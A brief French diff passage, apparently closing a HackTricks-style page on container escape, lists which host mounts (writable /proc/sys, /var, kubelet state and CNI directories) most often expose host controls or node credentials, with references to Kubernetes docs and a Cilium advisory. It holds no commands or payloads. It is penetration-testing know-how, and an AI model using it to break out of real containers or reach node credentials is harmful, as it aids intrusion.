+- Des entrées proc/sys inscriptibles signifient souvent que le mount expose des contrôles kernel globaux de l’host plutôt qu’une vue container sûre.
+- Les chemins `/var` montés méritent un review des credentials et des workloads voisins, pas seulement un review du filesystem.
+- Les répertoires d’état du kubelet et les chemins CNI/plugin méritent la même priorité que les runtime sockets parce qu’ils se trouvent souvent directement sur le chemin de création des pods et de distribution des credentials du node.
+
+## References
+
+- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
+- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
 {{#include ../../../banners/hacktricks-training.md}}
